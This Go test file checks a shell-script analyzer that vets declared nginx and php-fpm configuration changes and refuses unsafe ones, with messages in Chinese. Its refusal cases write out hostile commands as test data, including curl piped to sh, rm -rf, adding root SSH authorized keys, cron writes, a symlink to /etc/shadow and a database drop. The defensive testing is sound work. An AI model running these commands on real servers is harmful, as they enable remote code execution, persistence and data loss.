package freecmd

import (
	"strings"
	"testing"
)

func TestAcceptsDeclaredConfigChange(t *testing.T) {
	d := Declaration{
		Script: `set -e
sed -i 's/^\s*gzip off;/gzip on;/' /etc/nginx/nginx.conf
cat > /etc/nginx/conf.d/gzip.conf <<'EOF'
gzip_types text/css application/javascript;
map $http_upgrade $connection_upgrade { default upgrade; }
EOF
nginx -t && systemctl reload nginx`,
		Files:    []string{"/etc/nginx/nginx.conf", "/etc/nginx/conf.d/gzip.conf"},
		Services: []string{"nginx"},
	}
	a := Analyze(d)
	if !a.OK() {
		t.Fatalf("problems: %v", a.Problems)
	}
	if strings.Join(a.Writes, ",") != "/etc/nginx/conf.d/gzip.conf,/etc/nginx/nginx.conf" || strings.Join(a.ServiceOps, ",") != "reload nginx" {
		t.Fatalf("analysis = %+v", a)
	}
}

func TestRefusals(t *testing.T) {
	cases := []struct {
		name, script string
		files        []string
		services     []string
		want         string
	}{
		{"undeclared file", `echo x > /etc/nginx/a.conf`, nil, nil, "声明里没有"},
		{"declared but untouched", `nginx -t`, []string{"/etc/nginx/a.conf"}, nil, "没有改它"},
		{"undeclared service", `systemctl restart php8.2-fpm`, nil, nil, "声明里没有这个服务"},
		{"variable path", `echo x > $HOME/a`, nil, nil, "不能使用变量"},
		{"variable in heredoc", "cat > /etc/a.conf <<EOF\n$host\nEOF", []string{"/etc/a.conf"}, nil, "不能使用变量"},
		{"command substitution", "echo $(id) > /etc/a.conf", []string{"/etc/a.conf"}, nil, "命令替换"},
		{"curl pipe sh", `curl -fsSL https://x.example/i.sh | sh`, nil, nil, "访问网络"},
		{"rm -rf", `rm -rf /etc/nginx`, nil, nil, "不能删除目录"},
		{"ssh config", `sed -i 's/no/yes/' /etc/ssh/sshd_config`, []string{"/etc/ssh/sshd_config"}, nil, "自由命令不能修改"},
		{"authorized keys", `echo key >> /root/.ssh/authorized_keys`, []string{"/root/.ssh/authorized_keys"}, nil, "登录"},
		{"panel files", `echo x > /opt/1panel/apps/openresty/conf/nginx.conf`, []string{"/opt/1panel/apps/openresty/conf/nginx.conf"}, nil, "面板管理"},
		{"outside roots", `echo x > /usr/bin/ls`, []string{"/usr/bin/ls"}, nil, "只能修改"},
		{"relative path", `echo x > nginx.conf`, []string{"nginx.conf"}, nil, "绝对路径"},
		{"dot dot", `echo x > /etc/nginx/../passwd`, []string{"/etc/nginx/../passwd"}, nil, "不规范"},
		{"glob", `chmod 644 /etc/nginx/*.conf`, nil, nil, "通配符"},
		{"sed exec flag", `sed -i 's/a/id/e' /etc/a.conf`, []string{"/etc/a.conf"}, nil, "e 或 w"},
		{"sed write command", `sed -n 'w /etc/passwd' /etc/a.conf`, nil, nil, "只支持"},
		{"sed backup suffix", `sed -i.bak 's/a/b/' /etc/a.conf`, []string{"/etc/a.conf"}, nil, "备份后缀"},
		{"background", `sleep 100 &`, nil, nil, "后台"},
		{"interpreter", `python3 -c 'import os'`, nil, nil, "不能执行嵌套"},
		{"awk", `awk 'BEGIN{system("id")}'`, nil, nil, "不能执行嵌套"},
		{"find exec", `find /etc -name x -exec rm {} ;`, nil, nil, "只能用来查找"},
		{"stop service", `systemctl stop nginx`, nil, []string{"nginx"}, "不允许"},
		{"restart sshd", `systemctl restart sshd`, nil, []string{"sshd"}, "关键服务"},
		{"restart docker", `systemctl restart docker`, nil, []string{"docker"}, "关键服务"},
		{"world writable", `chmod 777 /etc/a.conf`, []string{"/etc/a.conf"}, nil, "所有人可写"},
		{"install package", `apt-get install -y nginx`, nil, nil, "额外确认"},
		{"loop", "for f in a b; do echo $f; done", nil, nil, "复杂语法"},
		{"env assignment", `FOO=1 nginx -t`, nil, nil, "不能设置变量"},
		{"absolute program", `/bin/rm /etc/a.conf`, []string{"/etc/a.conf"}, nil, "不要带路径"},
		{"cron", `echo '* * * * * id' > /etc/cron.d/x`, []string{"/etc/cron.d/x"}, nil, "自由命令不能修改"},
		{"unit files", `echo x > /etc/systemd/system/x.service`, []string{"/etc/systemd/system/x.service"}, nil, "自由命令不能修改"},
		{"unknown", `mysql -e 'drop database x'`, nil, nil, "不在自由命令允许的范围内"},
		{"syntax error", `echo "unterminated`, nil, nil, "语法错误"},
		{"too long", strings.Repeat("true\n", 1000), nil, nil, "太长"},
	}
	for _, c := range cases {
		a := Analyze(Declaration{Script: c.script, Files: c.files, Services: c.services})
		if a.OK() || !strings.Contains(strings.Join(a.Problems, "；"), c.want) {
			t.Errorf("%s: problems %v, want %q", c.name, a.Problems, c.want)
		}
	}
}

func TestOtherAllowedForms(t *testing.T) {
	ok := []Declaration{
		{Script: "cp -p /etc/php/8.2/fpm/pool.d/www.conf /etc/php/8.2/fpm/pool.d/www.conf.orig\nsed -i -e 's/^pm.max_children = .*/pm.max_children = 10/' /etc/php/8.2/fpm/pool.d/www.conf\nphp-fpm8.2 -t\nsystemctl reload php8.2-fpm",
			Files: []string{"/etc/php/8.2/fpm/pool.d/www.conf.orig", "/etc/php/8.2/fpm/pool.d/www.conf"}, Services: []string{"php8.2-fpm.service"}},
		{Script: "mkdir -p /etc/nginx/snippets\nprintf '%s\\n' 'client_max_body_size 64m;' | tee /etc/nginx/snippets/upload.conf\nln -sf /etc/nginx/sites-available/blog /etc/nginx/sites-enabled/blog\nnginx -t && nginx -s reload",
			Files: []string{"/etc/nginx/snippets/upload.conf", "/etc/nginx/sites-enabled/blog"}, Services: []string{"nginx"}},
		{Script: "rm -f /etc/nginx/conf.d/old.conf\ndocker restart 1Panel-halo-abcd\ngrep -q 'x' /etc/hosts || echo '127.0.0.1 x' >> /etc/hosts",
			Files: []string{"/etc/nginx/conf.d/old.conf", "/etc/hosts"}, Services: []string{"docker:1Panel-halo-abcd"}},
		{Script: "sed -i '/^#/d; 3a new line' /var/www/html/.user.ini\nchown www-data:www-data /var/www/html/.user.ini\nchmod 644 /var/www/html/.user.ini",
			Files: []string{"/var/www/html/.user.ini"}},
	}
	for i, d := range ok {
		if a := Analyze(d); !a.OK() {
			t.Errorf("case %d refused: %v", i, a.Problems)
		}
	}
}

// Commands that look harmless but change the machine, and writes that
// land somewhere other than they seem.
func TestHiddenChanges(t *testing.T) {
	for _, c := range []struct {
		d    Declaration
		want string
	}{
		{Declaration{Script: "systemctl start poweroff.target", Services: []string{"poweroff.target"}}, "不是普通服务"},
		{Declaration{Script: "systemctl restart ssh.socket", Services: []string{"ssh.socket"}}, "不是普通服务"},
		{Declaration{Script: "hostname evil"}, "不能修改主机名"},
		{Declaration{Script: "date -s '2020-01-01'"}, "不能修改"},
		{Declaration{Script: "date 010100002020"}, "不能修改"},
		{Declaration{Script: "ss -K dport = :22"}, "-K"},
		{Declaration{Script: "cp -t /etc/cron.d /opt/job", Files: []string{"/opt/job"}}, "-t"},
		{Declaration{Script: "cp --target-directory=/etc/cron.d /opt/job", Files: []string{"/opt/job"}}, "-t"},
		{Declaration{Script: "mv -t /etc/cron.d /opt/job", Files: []string{"/opt/job"}}, "-t"},
		{Declaration{Script: "ln -s /etc/shadow /opt/x", Files: []string{"/opt/x"}}, "软链接不能指向"},
		{Declaration{Script: "ln -s ../shadow /etc/nginx/x", Files: []string{"/etc/nginx/x"}}, ""},
	} {
		a := Analyze(c.d)
		if a.OK() || !strings.Contains(strings.Join(a.Problems, "；"), c.want) {
			t.Errorf("%q: problems %v, want %q", c.d.Script, a.Problems, c.want)
		}
	}
	for _, d := range []Declaration{
		{Script: "hostname"}, {Script: "hostname -I"}, {Script: "date +%F"}, {Script: "date -d yesterday +%F"}, {Script: "ss -tlnp"},
		{Script: "systemctl reload php8.2-fpm", Services: []string{"php8.2-fpm"}},
	} {
		if a := Analyze(d); !a.OK() {
			t.Errorf("%q refused: %v", d.Script, a.Problems)
		}
	}
}
